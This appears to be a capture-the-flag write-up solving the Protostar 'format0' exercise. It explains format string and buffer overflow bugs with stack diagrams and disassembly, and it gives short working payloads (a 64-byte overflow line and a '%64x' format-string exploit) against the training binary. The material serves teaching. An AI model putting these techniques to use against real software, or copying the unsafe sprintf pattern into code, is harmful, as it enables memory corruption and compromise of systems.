# Format 0

## Source Code

```C
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>
#include <string.h>

void vuln(char *string)
{
  volatile int target;
  char buffer[64];

  target = 0;

  sprintf(buffer, string);              //<- This code causes Buffer overflow
  
  if(target == 0xdeadbeef) {
      printf("you have hit the target correctly :)\n");
  }
}

int main(int argc, char **argv)
{
  vuln(argv[1]);
}
```

## Overview & Idea

- `sprintf(char *str, char *format, arg...)` doesn't specify the `char *format`, so, we can use user input to exploit either with BOF or Format String vulnerability.

## Details

### With BOF

- We just use random 64 bytes to fill up buffer variable, after that 64 bytes is 0xdeadbeef to overwrite the target variable to pass into true branch of if statement.

- **RESULT**:
```
root@protostar:/opt/protostar/bin# (python -c 'print("a"*64+"\xef\xbe\xad\xde")') | xargs ./format0
you have hit the target correctly :)
```

### With Format String

#### How does Format String works?

- In x86_32 Assembly, if we call to a function with arguments, we must pass it into stack

```
|        .  .  .  .
|  +-------------------+      <- esp
|  |                   |      
|  |                   |      
|  |  Content of func  |      
|  |                   |      
|  |                   |      
|  +-------------------+      <- ebp                          
|  |    EBP Reserve    |                               
|  +-------------------+                                   
S  |        RET        |
t  +-------------------+
a  |     argument 1    |
c  +-------------------+
k  |     argument 2    |
|  +-------------------+
|  |     argument 3    |
|  +-------------------+
|  |     argument ...  |
|  +-------------------+
|        .  .  .  .

```

- Let's check the disassembly of `printf("%d %d %d\n", 3, 1, 2);` statement

```
   0x08049166 <+0>:     lea    ecx,[esp+0x4]
   0x0804916a <+4>:     and    esp,0xfffffff0
   0x0804916d <+7>:     push   DWORD PTR [ecx-0x4]
   0x08049170 <+10>:    push   ebp
   0x08049171 <+11>:    mov    ebp,esp
   0x08049173 <+13>:    push   ebx
   0x08049174 <+14>:    push   ecx
   0x08049175 <+15>:    call   0x80491a5 <__x86.get_pc_thunk.ax>
   -------------------------------------------------------
   0x0804917a <+20>:    add    eax,0x2e7a                |
   0x0804917f <+25>:    push   0x2                       |
   0x08049181 <+27>:    push   0x1                       |    
   0x08049183 <+29>:    push   0x3                       |    call to printf
   0x08049185 <+31>:    lea    edx,[eax-0x1fec]          |    
   0x0804918b <+37>:    push   edx                       | 
   0x0804918c <+38>:    mov    ebx,eax                   |     
   0x0804918e <+40>:    call   0x8049030 <printf@plt>    |                    
   -------------------------------------------------------
   0x08049193 <+45>:    add    esp,0x10
   0x08049196 <+48>:    mov    eax,0x0
   0x0804919b <+53>:    lea    esp,[ebp-0x8]
   0x0804919e <+56>:    pop    ecx
   0x0804919f <+57>:    pop    ebx
   0x080491a0 <+58>:    pop    ebp
   0x080491a1 <+59>:    lea    esp,[ecx-0x4]
   0x080491a4 <+62>:    ret
```

- We can see that, First `add   eax, 0x2e7a` is statement that store address of GOT, then, it pushs 3 arguments into stack, then it pushs the address of `char *format` from GOT into stack. So, stack will look like this:

```
|        .  .  .  .
|  +-------------------+      <- esp
|  |                   |      
|  |                   |      
|  | Content of printf |      
|  |                   |      
|  |                   |      
|  +-------------------+      <- ebp                          
|  |    EBP Reserve    |                               
|  +-------------------+                                   
S  |        RET        |
t  +-------------------+
a  |   "%d %d %d\n"    |
c  +-------------------+
k  |         3         |
|  +-------------------+
|  |         1         |
|  +-------------------+
|  |         2         |
|  +-------------------+
|        .  .  .  .

```

- With a call to printf like that it'll print the contents of argument that is on stack. But, what if we do not feed the argument 3, 1, 2? Does it print content of stack? Yes, It will be. Let's test some code to see what is it printf:

```c
// gcc -m32 -no-pie fmt0.c -o fmt
#include<stdio.h>

int main()
{
    printf("%x %x %x\n");
}

// result of this program can be different in each computer, each run with gdb and without gdb
// turn off the ASLR to make it easy to understand

// Result:
// ffffd514 ffffd51c 804917a

// -------------------------------------------------Stack-----------------------------------------------------------
// 00:0000│ esp 0xffffd440 —▸ 0x804a008 ◂— '%x %x %x\n'
// 01:0004│     0xffffd444 —▸ 0xffffd514 —▸ 0xffffd668 ◂— '/mnt/c/users/whatd/Desktop/CTF/pwn/labs/fmt/fmt0'
// 02:0008│     0xffffd448 —▸ 0xffffd51c —▸ 0xffffd699 ◂— 'HOSTTYPE=x86_64'
// 03:000c│     0xffffd44c —▸ 0x804917a (main+20) ◂— add    eax, 0x2e7a
// 04:0010│     0xffffd450 —▸ 0xffffd470 ◂— 0x1
// 05:0014│     0xffffd454 ◂— 0x0
// 06:0018│ ebp 0xffffd458 ◂— 0x0
// 07:001c│     0xffffd45c —▸ 0xf7ddf905 (__libc_start_main+229) ◂— add    esp, 0x10
```

- It works exactly with our expection.

### Format speciers

- You can click on this [link](https://eecs.wsu.edu/~cs150/reading/printf.htm) to explore more specifier in C. Below is some specifier that we'll play with :3

|  Specifier |  Used for     |
| :---: | :---: |
|   %c | print single character |
| %s | print a string |
| %x | hex integer    |
| %p | an address  (or pointer)   |
| %n | write 4 bytes on stack with value is size of printed string | 
| %hn | write 2 bytes on stack with value is size of printed string | 
| %hhn | write 1 bytes on stack with value is size of printed string | 

### Format String Vulnerablility

- The Format String exploit occurs when the submitted data of an input string is evaluated as a command by the application. In this way, the attacker could execute code, read the stack, or cause a segmentation fault in the running application, causing new behaviors that could compromise the security or the stability of the system.
- Remember the above example with C code. We can use `printf("%d %d %d");` to read the stack. And if we write code like this:

```
char buffer[] = "%d %d %d"
printf(buffer)
```

- It does the same `printf("%d %d %d");`, and if buffer is user input, it's so dangerous because user can read, write on stack or do somethings that we don't expected.

### Back to challenge

- `int sprintf(char *str, char *fmt, arg...);` sends formatted output to a string pointed to, by str.
- So, we can use some format specifier to ask the program gave the output we want and put it in str, with this chall is buffer.
- If you read the link that I gave you in above, you can remember `%[sign_option][width_field.precision]<format_specifier>`. We can use width_field to ask the program print the size that we want.

- We need 64 bytes to fill up buffer and 4 bytes to overwrite target. we will use this format to do it: `"%64x\xef\xbe\xad\xde"`

### Exploit

```python
# filename: exp.py

payload = "%64x\xef\xbe\xad\xde"
print(payload)

# python exp.py | xargs ./fmt0
```
### Result

```
root@protostar:/opt/protostar/bin# python exp.py | xargs ./format0
you have hit the target correctly :)
```